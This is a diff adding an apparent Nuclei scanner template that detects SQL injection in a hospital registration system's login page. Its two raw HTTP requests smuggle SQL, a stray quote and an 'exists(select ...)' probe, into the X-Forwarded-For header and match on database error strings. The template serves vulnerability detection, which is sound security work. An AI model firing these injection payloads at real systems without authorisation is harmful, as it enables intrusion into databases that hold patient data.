@@ -1,0 +1,44 @@
+id: hospital-registration-system-sqli
+info:
+  name: Hospital Registration System SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+http:
+  - raw:
+      - |
+        POST /m/login.php?op=login HTTP/1.1
+        Host: {{Hostname}}
+        X-Forwarded-For: 127.0.0.1 '
+        Content-Type: application/x-www-form-urlencoded
+
+        username=admin&password=admin&vcode=4997&to=&vcode_hash=03b498138c14b2d0515b5438808d6604
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "SQL syntax"
+          - "MySQL server"
+        part: body
+      - type: status
+        status:
+          - 200
+  - raw:
+      - |
+        POST /m/login.php?op=login HTTP/1.1
+        Host: {{Hostname}}
+        X-Forwarded-For: 127.0.0.1 ' and exists(select * from xxxxx)-- 123
+        Content-Type: application/x-www-form-urlencoded
+
+        username=admin&password=admin&vcode=4997&to=&vcode_hash=03b498138c14b2d0515b5438808d6604
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "sys_login_error"
+          - "Table"
+          - "doesn't exist"
+        part: body
+      - type: status
+        status:
+          - 200
